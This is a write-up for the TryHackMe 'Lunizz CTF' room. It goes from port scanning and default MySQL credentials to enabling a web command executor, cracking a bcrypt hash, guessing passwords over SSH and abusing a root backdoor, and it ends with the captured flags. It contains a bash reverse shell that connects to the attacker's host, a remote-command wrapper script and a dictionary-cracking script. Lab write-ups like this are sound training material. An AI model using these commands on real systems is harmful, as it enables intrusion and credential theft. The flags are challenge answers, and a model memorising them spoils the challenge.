| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Lunizz CTF](https://tryhackme.com/room/lunizzctfnd) |  
| 🏷 **Type**       | THM Challenge                                        |
| 🖥 **OS**         | Linux                                                |
| 🎯 **Difficulty** | Medium                                               |
| 📁 **Tags**       | web enumeration, MySQL, bcrypt                       |

## Task 1: Are you able to solve this challenge?

### What is the default password for mysql

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 19:43 +0100
Nmap scan report for 10.82.150.19
Host is up (0.053s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 86:6f:5b:c5:0c:81:67:df:12:dd:62:26:18:f4:1e:f3 (RSA)
|   256 15:40:b9:65:09:d6:5e:a5:7a:97:bc:8a:2d:68:1f:8d (ECDSA)
|_  256 37:dc:f6:c6:16:ee:85:cf:38:01:0c:2e:5f:ce:1c:f8 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp  open  mysql   MySQL 8.0.42-0ubuntu0.20.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-02-11T23:12:30
|_Not valid after:  2031-02-09T23:12:30
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.20.04.1
|   Thread ID: 20
|   Capabilities flags: 65535
|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, FoundRows, SupportsCompression, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, Support41Auth, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SwitchToSSLAfterHandshake, SupportsTransactions, LongPassword, SupportsLoadDataLocal, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x1B<O\x06C[+\x1FZt\x0C\x15r{\x11N,\x17[O
|_  Auth Plugin Name: caching_sha2_password
4444/tcp  open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     bGV0bWVpbg==
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     bGV0bWVpbg==
|   SSLSessionReq: 
|     Can you decode this for me?
|_    ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
5000/tcp  open  upnp?
| fingerprint-strings: 
|   GenericLines, GetRequest, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, TerminalServer, ZendJavaBridge, afp, ms-sql-s: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
33060/tcp open  mysqlx  MySQL X protocol listener
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4444-TCP:V=7.98%I=7%D=1/17%Time=696BD87A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"Can\x20you\x20decode\x20this\x20for\x20me\?\nbGV0bWVpbg==\n")%r(
SF:GetRequest,37,"Can\x20you\x20decode\x20this\x20for\x20me\?\nbGV0bWVpbg=
SF:=\nWrong\x20Password")%r(SSLSessionReq,3D,"Can\x20you\x20decode\x20this
SF:\x20for\x20me\?\nZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.98%I=7%D=1/17%Time=696BD874%P=x86_64-pc-linux-gnu%r(NU
SF:LL,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\
SF:x20/usr/local/ssl/openssl\.cnf")%r(GenericLines,46,"OpenSSH\x205\.1\nUn
SF:able\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\
SF:.cnf")%r(GetRequest,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config
SF:\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(ZendJavaBridge,46,"
SF:OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr
SF:/local/ssl/openssl\.cnf")%r(RPCCheck,46,"OpenSSH\x205\.1\nUnable\x20to\
SF:x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(LD
SF:APSearchReq,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info
SF:\x20from\x20/usr/local/ssl/openssl\.cnf")%r(LDAPBindReq,46,"OpenSSH\x20
SF:5\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/
SF:openssl\.cnf")%r(TerminalServer,46,"OpenSSH\x205\.1\nUnable\x20to\x20lo
SF:ad\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(NCP,46,
SF:"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/us
SF:r/local/ssl/openssl\.cnf")%r(ms-sql-s,46,"OpenSSH\x205\.1\nUnable\x20to
SF:\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(a
SF:fp,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\
SF:x20/usr/local/ssl/openssl\.cnf");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.96 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
301      GET        9l       28w      313c http://10.82.150.19/hidden => http://10.82.150.19/hidden/
200      GET      375l      964w    10918c http://10.82.150.19/index.html
200      GET       13l       46w      339c http://10.82.150.19/instructions.txt
200      GET       13l       41w      396c http://10.82.150.19/hidden/index.php
301      GET        9l       28w      315c http://10.82.150.19/whatever => http://10.82.150.19/whatever/
200      GET        0l        0w        0c http://10.82.150.19/whatever/config.php
301      GET        9l       28w      321c http://10.82.150.19/hidden/uploads => http://10.82.150.19/hidden/uploads/
200      GET       13l       25w      247c http://10.82.150.19/whatever/index.php
<SNIP>
```

#### Discover MySQL credentials in `/instructions.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ curl http://$TARGET/instructions.txt
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

### I can't run commands, there must be a mysql column that controls command executer

#### Discover 'Command Executer' running at `/whatever/index.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ curl http://$TARGET/whatever/index.php 
Command Executer Mode :0<br><br>
<!DOCTYPE html>
<html>
<head>
</head>
<body>
<h1>Command Executer</h1>
<form action="index.php" method="post">
<input type="text" placeholder="Command to execute" name="cmd">
<input type="submit">
</body>
</html>
```
Current mode `Command Executer Mode :0` suggests that command executor is disabled. 

### a folder shouldn't be...

#### Enumerate MySQL using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ mysql -h $TARGET -u runcheck -pCTF_script_cave_changeme --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 36
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+
3 rows in set (0.041 sec)

MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.325 sec)

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
1 row in set (0.065 sec)
```
It seems that column `run` in `runornot.runcheck` table holds `Command Executer Mode`.

#### Enabled command executor
```
MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.053 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

#### Confirm executor is enabled
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ curl -s http://$TARGET/whatever/index.php -d 'cmd=echo;id' | tail -n +2 | head -n -13
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Prepare exploit for arbitrary command execution
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ { cat <<'EOF' > cmd.sh
curl -s http://$TARGET/whatever/index.php -d "cmd=echo;$1" | tail -n +2 | head -n -13
EOF
} && chmod +x cmd.sh
```

#### Start `nc` to listen for reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection
```
CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | jq -sRr @uri)
./cmd.sh $CMD 
```

#### Confirm foothold gained
```
connect to [192.168.130.56] from (UNKNOWN) [10.82.150.19] 53178
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-81-135-52:/var/www/html/whatever$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Identify unusual `/proct` directory
```
www-data@ip-10-81-135-52:/$ ls -la /
<SNIP>
dr-xr-xr-x 191 root root          0 Jan 17 18:40 proc
drwxr-xr-x   3 adam adam       4096 Feb 28  2021 proct
drwx------   7 root root       4096 Jun  7  2025 root
<SNIP>
```

### hi adam, do you remember our place?

#### Discover `bcrypt` hash and encryption algorithm in `/proct/pass/bcrypt_encryption.py`
```
www-data@ip-10-81-135-52:/$ cat /proct/pass/bcrypt_encryption.py
cat /proct/pass/bcrypt_encryption.py
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()
```

#### Reverse algorithm to conduct dictionary attack against discovered hash
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ \
python3 - <<'EOF'
import bcrypt
import base64

hash = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
salt = hash[:29]

with open("/usr/share/wordlists/rockyou.txt") as dictionary:
    print(f"[*] Conducting dictionary attack against [{hash}]");
    for password in dictionary:
        stripped_password = password.strip()
        encoded_password = base64.b64encode(stripped_password.encode('ascii'))
        password_hash = bcrypt.hashpw(encoded_password, salt)
        print(f"[*] {stripped_password} -> {encoded_password} -> {password_hash}")
        if password_hash == hash:
            print(f"[+] Cracked: {password}")
            exit(0)
print("[!] Exhuasted")
exit(1)
EOF
[*] Conducting dictionary attack against [b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e']
[*] pass -> b'cGFzcw==' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.KVZcgnRLzyyBQiDeRIXt/nOG4DzHexS'
[*] 123456 -> b'MTIzNDU2' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.V/CbnWYcK8QXsyxHbDxIMvX0nznYBUS'
[*] 12345 -> b'MTIzNDU=' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.srZ4L8.3Po1zXLflu7EFP7Os9wTFEL6'
[*] 123456789 -> b'MTIzNDU2Nzg5' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.2bdmqfkHMggqSNbMDudCz2GT0.DRPLy'
[*] password -> b'cGFzc3dvcmQ=' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.8vczWcLZfV2BVb0DmmTzqfzI/8XBwEq'
<SNIP>
[*] bowwow -> b'Ym93d293' -> b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
[+] Cracked: bowwow
```
Since `bcrypt_encryption.py` is owned by user `adam` we could assume that `bowwow` will be its password.

#### Access target over SSH using `adam:bowwow` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ ssh adam@$TARGET
<SNIP>>
$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
```

#### Enumerate `adam` home directory to find `to_my_best_friend_adam.txt`
```
$ cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
```
Using discovered URL we are landing on Google Maps showing `northern lights`, and this is a place in question.

### user.txt
We could assume that `mason` is `adam` best friend and in the message that has been left we could find:
>i will make that lights my password

we could also assume that `mason` password is `northernlights`

#### Access target over SSH using `mason:northernlights` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lunizz CTF]
└─$ ssh mason@$TARGET
<SNIP>
$ id
uid=1001(mason) gid=1001(mason) groups=1001(mason)
```

#### Capture user flag
```
$ cat /home/mason/user.txt
thm{23cd53cbb37a37a74d4425b703d91883}
```

### root.txt
Previous enumeration showed that there is some kind of backdoor running at HTTP 127.0.0.1:8080

#### Access backdoor with `curl`
```
$ curl http://127.0.0.1:8080
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
Since this seems to be `mason` backdoor, we will use his password.

#### Access backdoor using `mason` password
```
$ curl http://127.0.0.1:8080 -d 'password=northernlights&cmdtype=lsla'
total 48
drwx------  7 root root 4096 Jun  7  2025 .
drwxr-xr-x 25 root root 4096 Jan 18 12:04 ..
lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Feb 10  2021 .bashrc
drwx------  3 root root 4096 Feb 12  2021 .cache
drwx------  3 root root 4096 Feb 12  2021 .gnupg
-rw-r--r--  1 root root 1044 Feb 28  2021 index.php
drwxr-xr-x  3 root root 4096 Feb  9  2021 .local
lrwxrwxrwx  1 root root    9 Feb 11  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r-----  1 root root   38 Feb 28  2021 r00t.txt
-rw-r--r--  1 root root   66 Feb 28  2021 .selected_editor
drwx------  3 root root 4096 Apr 26  2025 snap
drwx------  2 root root 4096 Feb  9  2021 .ssh
-rw-------  1 root root    0 Jun  7  2025 .viminfo
<SNIP>
```
It seems to be working as we were able to `ls -la /root`.

#### Execute backdoor `passwd` command
```
$ curl http://127.0.0.1:8080 -d 'password=northernlights&cmdtype=passwd'
<br>Password Changed To :northernlights
<SNIP>
```
'Some' password has been changed to `northernlights`.

#### Try accessing target as `root` using `northernlights` password
```
$ su              
Password: 
root@ip-10-82-150-19:/home/mason# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@ip-10-82-150-19:/home/mason# cat /root/r00t.txt 
thm{ad23b9c63602960371b50c7a697265db}
```
